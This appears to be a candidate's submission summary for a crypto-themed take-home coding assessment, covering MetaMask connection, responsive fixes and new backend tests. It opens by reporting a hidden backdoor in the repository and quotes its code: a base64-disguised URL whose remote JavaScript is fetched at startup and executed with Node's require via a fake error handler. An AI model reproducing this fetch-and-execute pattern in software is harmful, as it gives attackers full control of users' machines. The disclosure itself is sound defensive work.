# Submission summary

> Full per-file detail, with before/after and reasoning, is in **[CHANGELOG-ASSESSMENT.md](./CHANGELOG-ASSESSMENT.md)**.

```bash
nvm use 20
npm install
npm test     # 91 backend + 21 frontend = 112 tests
npm start    # client :3000, API :5001
```

---

## ⚠️ Please read first: the repository contained a remote-code-execution backdoor

`server/controllers/auth.controller.js` executed this at **module import time** — not inside any request
handler, so merely starting the server was enough:

```js
axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
```

- `config.publicKey` was not a key. It base64-decoded to
  `https://api.jsonstorage.net/v1/json/2ef8c758-a96f-459e-b036-b3b90379a165/f89e8264-86c2-4684-94da-c3f82d59370f`
- `middleware/errorHandler.js` never handled an error. It executed the downloaded string:
  `new Function.constructor("require", errCode)`, then invoked it **with Node's `require` in scope**.

Net effect: `npm start` → fetch attacker-controlled JavaScript → run it with full filesystem, network and
process access as the user.

The camouflage was deliberate — a URL named `publicKey`, an evaluator named `errorHandler`, base64 to
defeat grep, and the payload fetched at runtime so the repo itself looks clean. This matches the publicly
documented **"Contagious Interview"** campaign, which distributes fake take-home assessments to
developers in the crypto/DeFi space.

I removed it in the first commit (`2387365`) before installing dependencies or running anything. **The
payload was never fetched or executed** — `node_modules/` did not exist and the server was never started.

If this was an intentional part of the exercise, that is the answer. If it was not, **your repository is
compromised** and the jsonstorage.net endpoint is worth reporting.

Verified clean: `require('./server/app')` with `http/https.request` patched to abort makes no outbound
request on import.

---

## Task 1 — Wallet connection

The **Connect** button existed in three places (navbar desktop, navbar mobile, homepage CTA), all with no
`onClick`. Since the connected address must appear in all three, the state lives in a `WalletProvider`
context rather than a per-component hook, consumed by one `<ConnectWalletButton />`.

| Requirement | Implementation |
|---|---|
| Connect via MetaMask | `eth_requestAccounts`. `getMetaMaskProvider()` checks `window.ethereum.providers` first — with several wallet extensions installed, whoever wins `window.ethereum` may not be MetaMask. A non-MetaMask provider is reported as "not installed" rather than driven blindly. |
| Display the address | `0x1234…5678` with a status dot, plus a Copy / Disconnect menu |
| Handle account changes | `accountsChanged` — an empty array (locked, or access revoked) clears state; otherwise it swaps account. `chainChanged` tracks the network. Both removed on unmount. |
| Error handling | no MetaMask → message **+ an install link**; `4001` → "Connection request rejected"; `-32002` → "a request is already pending"; otherwise the provider's own message. Rendered in `role="alert"`; the button is disabled and `aria-busy` while connecting. |

Beyond the brief: a silent `eth_accounts` call on mount restores an already-authorised account across
refreshes **without** triggering the MetaMask popup, with a test asserting the popup method is never
called on that path.

**A bug I found by testing in a real browser rather than only in jsdom:** the listener effect read the
provider once at mount and bailed out if absent. MetaMask normally injects before React mounts — but when
it is late, listeners were never attached and *every account switch was silently ignored for the lifetime
of the page*. Connecting still worked, which is what made it easy to miss. The provider is now held in
state and the effects re-run when it appears. There is a regression test for it.

## Task 2 — Homepage responsiveness

**The root cause was not CSS.** `tailwindcss` was never installed — `postcss.config.js` referenced it and
CRA 5 auto-enables it whenever `tailwind.config.js` exists — and that config used ESM `export default` in
a file CRA loads with `require()`. Every `md:grid-cols-2`, `hidden md:flex`, `sm:px-6` in the codebase was
an inert string. The page had no responsive behaviour because it had no CSS at all.

A second blocker: the repo shipped **no `package-lock.json`**, so a fresh install today resolves
`typescript@7.0.2`, which `@typescript-eslint@5` cannot read — `eslint-plugin-jest` fails to load and the
build aborts with `Environment key "jest/globals" is unknown`. Pinned TS to `^4.9.5` and committed a
lockfile.

With the toolchain fixed, the layout work: the hero's fixed `h-[600px]` (which cannot grow with content
and clipped the three-line mobile headline) became `min-h-*`; responsive steps were added to the hero
copy, six section headings, section spacing, five grid gaps and the blog padding; the property price/ROI
row got `gap-4`/`min-w-0` (the columns touched at ~360px); the Discord CTA now uses the project's own
`.container`; FAQ toggles gained `aria-expanded`; six below-fold images became lazy. In the navbar the
brand truncates and scales, the links tighten between 768px and ~900px (where the desktop nav was active
but overflowing), the hamburger gained `aria-label`/`aria-expanded`/`aria-controls` and a 44px tap
target, and the mobile Connect button is full-width instead of a stray `w-auto`.

Verified in Chrome at **375, 390, 768 and 1440**: no horizontal overflow and zero over-wide elements at
any size; hamburger only below `md`; grids 1 / 2 / 4 columns.

## Task 3 — Backend tests

**There were no existing tests to review** — no test file, no test script, no `jest`/`supertest`/`mocha`
dependency anywhere at the initial commit. So "fix failing tests" became "fix the code that made every
database route fail", and the suite is new.

Mongoose 7 removed callback support from queries, and **every controller used it**, so every DB-backed
route threw before responding. Migrating them to `async/await` surfaced a series of real bugs:

- `req.body.lName` — a casing typo against a `required` field, so **every registration failed**
- `Property.update()` + `result.nModified` — both removed/renamed, so **`markAsSold` could never succeed**
- `if (err) res.status(400)…` with no `else`, then the success response → `ERR_HTTP_HEADERS_SENT`
- `users = new userM()` — a missing `var`, i.e. an implicit global shared across concurrent requests
- `"Invalid Credentials1"` vs `"Invalid Credentials2"` — account enumeration
- `userList` and `GET /api/user/:id` returning **password hashes**
- `express.json()` commented out, so `req.body` was `undefined` everywhere
- `new mongoose.mongo.GridFsStorage(...)` — a class that does not exist, thrown on every DB connect
- `default: Date.now()` in three schemas — evaluated once at module load, so every document shared the
  server's boot time

**91 tests across 7 files**, using `supertest` against the exported app and `mongodb-memory-server`, with
`@sendgrid/mail` mocked globally so no suite can make a real API call. **91.74% statement coverage.**

Several tests exist specifically to pin the bugs above, and I checked they actually bite — reintroducing
`result.nModified` turns exactly one test red while the other 24 stay green.

---

## Assumptions

1. **The backdoor was worth removing and reporting**, even though no task mentioned it.
2. **"Existing backend tests" did not exist**, so the suite was written from scratch.
3. **No MongoDB is provisioned**, so tests use an in-memory server, and `server/index.js` now starts the
   API even when the DB connection fails — otherwise the frontend has nothing to talk to locally.
4. **Migrating the controllers to Mongoose 8 was in scope**, because no test can pass against removed APIs.
5. **MetaMask only**, per the task wording, even though `@walletconnect/web3-provider` is a dependency.
6. **Raw EIP-1193 rather than the bundled `ethers@5`** — nothing here signs or reads balances, so ethers
   would add bundle weight and polyfill surface for no gain.
7. **Disconnect clears local state only** — MetaMask exposes no programmatic disconnect; revoking access
   is done from the extension.
8. **Only the homepage** was restyled for Task 2, as specified. Other pages are untouched.

**Known gap I did not close:** the `/api/auth/admin/*` routes have no authentication — anyone can list
users or reset any password, and the JWT is issued but never verified again. Adding auth middleware is a
feature rather than a fix and would change the frontend contract, so I documented it instead. It is the
first thing I would do next.
